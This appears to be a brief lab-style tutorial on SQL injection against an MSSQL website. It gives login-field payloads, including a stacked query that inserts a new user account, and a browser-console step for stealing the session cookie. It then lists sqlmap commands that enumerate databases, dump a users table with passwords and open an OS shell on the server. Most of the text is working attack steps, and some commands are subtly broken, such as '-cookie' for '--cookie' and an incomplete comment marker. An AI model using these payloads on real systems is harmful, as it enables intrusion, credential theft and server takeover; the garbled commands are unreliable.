SQL Injection is a technique often used to attack a website and it is also the must common website vulnerability on the Internet.

1- SQL Injection Attacks on MSSQL Database

Type the query: 
username: blah' or 1=1 - 
password: leave it empty
This would through an error 

username: blah';insert into login values ('john','apple123');--
password: leave it empty
This will create a user account.

Logging into the site using the new site: 
username: john
password: apple123

2- Performing SQL injection Attack Against MSSQL to Extract Databases and Webshell using SQLMAP. 

http://www.example.com

User/ username
pass/ password

once you are logged into the website, view Profile tab, and make a note of the URL in the address var of the browser. Right Click anywhere on the webpage and click

Inspect Element (Q) from the context menu. 
Developer Tools apearks, click Console and type document.cookie and Enter. Select cookie value and right-click to copy. 

From Kali Linux type:
sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> --dbs 

sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies --tables

sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies -T users --columns

sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies -T users --dump 

Now: You have obtained a list of users with their passowrds. 

sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> --os-shell

when prompts with options, press "y" and there you go, got a shell on the box.
